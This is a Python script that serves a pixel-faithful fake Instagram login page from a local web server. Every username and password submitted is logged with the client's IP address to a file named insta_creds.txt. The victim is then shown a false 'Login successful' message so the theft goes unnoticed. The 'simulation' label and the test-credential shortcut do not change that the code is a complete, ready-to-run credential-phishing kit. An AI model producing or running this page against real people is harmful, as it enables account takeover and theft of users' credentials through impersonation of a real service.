#!/usr/bin/env python3
"""
Exact Instagram Login Page Simulation
"""

import http.server
import socketserver
import urllib.parse
from datetime import datetime

PORT = 8080
LOG_FILE = "insta_creds.txt"

class InstagramExactHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html_content = self.get_exact_instagram_page()
            self.wfile.write(html_content.encode())
        else:
            super().do_GET()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        
        username = parsed_data.get('username', [''])[0]
        password = parsed_data.get('password', [''])[0]
        
        # Log credentials
        self.log_credentials(username, password)
        
        # Send loading page (NO REDIRECT)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        loading_page = self.get_loading_page()
        self.wfile.write(loading_page.encode())
    
    def log_credentials(self, username, password):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = self.client_address[0]
        log_entry = f"[{timestamp}] [{ip}] Username: {username} | Password: {password}\n"
        
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        
        print(f"[✓] Captured: {username}:{password}")
    
    def get_exact_instagram_page(self):
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* EXACT INSTAGRAM STYLES */
        :root {
            --ig-primary-background: 255, 255, 255;
            --ig-secondary-background: 250, 250, 250;
            --ig-primary-text: 38, 38, 38;
            --ig-secondary-text: 142, 142, 142;
            --ig-link: 0, 55, 107;
            --ig-primary-button: 0, 149, 246;
            --ig-primary-button-hover: 24, 119, 242;
            --ig-error-or-destructive: 237, 73, 86;
            --ig-separator: 219, 219, 219;
            --ig-stroke: 219, 219, 219;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: rgb(var(--ig-secondary-background));
            color: rgb(var(--ig-primary-text));
            font-size: 14px;
            line-height: 18px;
            -webkit-tap-highlight-color: transparent;
        }
        
        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .main-content {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 935px;
            margin-top: 32px;
            margin-bottom: 32px;
        }
        
        .phones-container {
            align-self: center;
            background-image: url('https://instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
            background-position: -46px 0;
            background-size: 468.32px 634.15px;
            flex-basis: 380.32px;
            height: 581.15px;
            margin-bottom: 12px;
            margin-right: 32px;
            position: relative;
        }
        
        .phone-screen {
            position: absolute;
            top: 27px;
            right: 23px;
            height: 538.84px;
            width: 250px;
            border-radius: 32px;
            overflow: hidden;
        }
        
        .screen-slide {
            height: 100%;
            width: 100%;
            position: absolute;
            opacity: 0;
            transition: opacity 1.5s ease-in-out;
            background-size: cover;
            background-position: center;
        }
        
        .screen-slide.active {
            opacity: 1;
        }
        
        .login-container {
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background-color: rgb(var(--ig-primary-background));
            border: 1px solid rgb(var(--ig-separator));
            border-radius: 1px;
            margin: 0 0 10px;
            padding: 10px 0;
            text-align: center;
        }
        
        .instagram-logo {
            background-image: url('https://instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            height: 51px;
            width: 175px;
            margin: 22px auto 12px;
            cursor: pointer;
        }
        
        .login-form {
            margin-top: 24px;
        }
        
        .input-container {
            margin: 0 40px 6px;
        }
        
        .login-input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background: rgb(var(--ig-secondary-background));
            border: 1px solid rgb(var(--ig-stroke));
            border-radius: 3px;
            font-size: 12px;
            line-height: 18px;
            color: rgb(var(--ig-primary-text));
            outline: none;
        }
        
        .login-input:focus {
            border-color: rgb(var(--ig-secondary-text));
        }
        
        .login-button {
            background-color: rgb(var(--ig-primary-button));
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            width: calc(100% - 80px);
            margin: 8px 40px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .login-button:hover:not(:disabled) {
            background-color: rgb(var(--ig-primary-button-hover));
        }
        
        .login-button:disabled {
            opacity: 0.7;
            cursor: default;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
            color: rgb(var(--ig-secondary-text));
            font-weight: 600;
            font-size: 13px;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: rgb(var(--ig-separator));
        }
        
        .divider span {
            margin: 0 18px;
        }
        
        .facebook-login {
            color: rgb(56, 81, 133);
            font-weight: 600;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin: 8px 40px;
        }
        
        .facebook-login i {
            margin-right: 8px;
            font-size: 18px;
        }
        
        .forgot-password {
            color: rgb(var(--ig-link));
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin: 12px 0;
        }
        
        .signup-box {
            background-color: rgb(var(--ig-primary-background));
            border: 1px solid rgb(var(--ig-separator));
            border-radius: 1px;
            padding: 25px;
            text-align: center;
            margin: 0 0 10px;
            font-size: 14px;
        }
        
        .signup-link {
            color: rgb(var(--ig-primary-button));
            font-weight: 600;
            text-decoration: none;
        }
        
        .get-app {
            text-align: center;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 20px;
        }
        
        .app-store-btn {
            height: 40px;
            cursor: pointer;
        }
        
        .footer {
            max-width: 935px;
            width: 100%;
            margin-top: 24px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }
        
        .footer-links a {
            color: rgb(var(--ig-secondary-text));
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .footer-meta {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
            color: rgb(var(--ig-secondary-text));
            font-size: 12px;
        }
        
        .language-select {
            border: none;
            background: transparent;
            color: rgb(var(--ig-secondary-text));
            font-size: 12px;
            cursor: pointer;
        }
        
        /* Loading overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(var(--ig-primary-background), 0.95);
            z-index: 10000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .instagram-logo-loading {
            background-image: url('https://instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            height: 60px;
            width: 200px;
            margin-bottom: 30px;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(var(--ig-separator), 0.3);
            border-top: 3px solid rgb(var(--ig-primary-button));
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            margin-top: 20px;
            color: rgb(var(--ig-primary-text));
            font-size: 14px;
            font-weight: 400;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="instagram-logo-loading"></div>
        <div class="spinner"></div>
        <div class="loading-text">Logging you in...</div>
    </div>
    
    <div class="container">
        <div class="main-content">
            <!-- Phone Mockup -->
            <div class="phones-container">
                <div class="phone-screen">
                    <div class="screen-slide active" style="background-image: url('https://instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png');"></div>
                    <div class="screen-slide" style="background-image: url('https://instagram.com/static/images/homepage/screenshots/screenshot2.png/4d62acb667fb.png');"></div>
                    <div class="screen-slide" style="background-image: url('https://instagram.com/static/images/homepage/screenshots/screenshot3.png/94edb770accf.png');"></div>
                    <div class="screen-slide" style="background-image: url('https://instagram.com/static/images/homepage/screenshots/screenshot4.png/a4fd825e3d49.png');"></div>
                </div>
            </div>
            
            <!-- Login Form -->
            <div class="login-container">
                <div class="login-box">
                    <div class="instagram-logo"></div>
                    
                    <form method="POST" id="loginForm" class="login-form">
                        <div class="input-container">
                            <input type="text" class="login-input" name="username" 
                                   placeholder="Phone number, username, or email" 
                                   aria-label="Phone number, username, or email"
                                   required>
                        </div>
                        
                        <div class="input-container">
                            <input type="password" class="login-input" name="password" 
                                   placeholder="Password" 
                                   aria-label="Password"
                                   required>
                        </div>
                        
                        <button type="submit" class="login-button" id="loginButton">Log In</button>
                    </form>
                    
                    <div class="divider">
                        <span>OR</span>
                    </div>
                    
                    <a href="#" class="facebook-login">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </a>
                    
                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>
                
                <div class="signup-box">
                    Don't have an account? <a href="#" class="signup-link">Sign up</a>
                </div>
                
                <div class="get-app">
                    <p style="color: rgb(var(--ig-primary-text)); font-size: 14px;">Get the app.</p>
                    <div class="app-stores">
                        <img src="https://instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" 
                             alt="Download on the App Store" class="app-store-btn">
                        <img src="https://instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" 
                             alt="Get it on Google Play" class="app-store-btn">
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>
            
            <div class="footer-meta">
                <select class="language-select">
                    <option value="en">English</option>
                    <option value="ml">മലയള</option>
                </select>
                <span>© 2024 Instagram from Meta</span>
            </div>
        </div>
    </div>
    
    <script>
        // Phone screen slideshow
        let currentSlide = 0;
        const slides = document.querySelectorAll('.screen-slide');
        
        function nextSlide() {
            slides[currentSlide].classList.remove('active');
            currentSlide = (currentSlide + 1) % slides.length;
            slides[currentSlide].classList.add('active');
        }
        
        setInterval(nextSlide, 3000);
        
        // Form validation
        const loginForm = document.getElementById('loginForm');
        const loginButton = document.getElementById('loginButton');
        const inputs = loginForm.querySelectorAll('input');
        
        function validateForm() {
            let isValid = true;
            inputs.forEach(input => {
                if (!input.value.trim()) {
                    isValid = false;
                }
            });
            loginButton.disabled = !isValid;
        }
        
        inputs.forEach(input => {
            input.addEventListener('input', validateForm);
        });
        
        // Form submission
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loading overlay
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            // Submit form after 3 seconds (NO REDIRECT)
            setTimeout(() => {
                this.submit();
            }, 3000);
        });
        
        // Auto-fill test credentials on Ctrl+T
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 't') {
                document.querySelector('input[name="username"]').value = 'demo_user';
                document.querySelector('input[name="password"]').value = 'Test@123';
                validateForm();
                alert('Test credentials filled!');
                e.preventDefault();
            }
        });
        
        // Initialize
        validateForm();
    </script>
</body>
</html>'''
    
    def get_loading_page(self):
        # This stays on loading page, doesn't redirect
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, sans-serif;
        }
        .loading-container {
            text-align: center;
        }
        .instagram-logo {
            background-image: url('https://instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            height: 60px;
            width: 200px;
            margin: 0 auto 30px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #dbdbdb;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #262626;
            font-size: 14px;
            margin-top: 15px;
        }
        .info-text {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="instagram-logo"></div>
        <div class="spinner"></div>
        <div class="loading-text">Login successful</div>
        <div class="info-text">You can close this window</div>
    </div>
</body>
</html>'''
    
    def log_message(self, format, *args):
        pass

def main():
    print("=" * 60)
    print("EXACT INSTAGRAM LOGIN PAGE")
    print("=" * 60)
    print(f"📍 URL: http://localhost:{PORT}")
    print(f"📝 Logs: {LOG_FILE}")
    print("🎯 Test: Press Ctrl+T on login page for test credentials")
    print("=" * 60)
    
    try:
        with socketserver.TCPServer(("", PORT), InstagramExactHandler) as httpd:
            print("✅ Server running... (Ctrl+C to stop)")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()